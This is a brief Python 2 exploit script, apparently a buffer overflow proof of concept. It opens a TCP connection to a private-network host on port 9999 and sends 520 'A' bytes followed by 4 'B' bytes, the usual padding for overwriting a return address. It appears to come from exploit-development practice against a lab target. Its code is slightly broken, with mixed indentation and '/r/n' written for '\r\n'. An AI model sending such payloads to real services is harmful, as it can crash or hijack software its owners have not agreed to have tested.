#!/usr/bin/python 
import sys, socket  

shell = "A" * 520 + "B" * 4

try: 
				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
                                s.connect(( '192.168.31.148', 9999)) 
				
				s.send(( '/r/n' + shell))  
				s.close()  
			     
except : 
				print "error in connection"
				sys.exit()
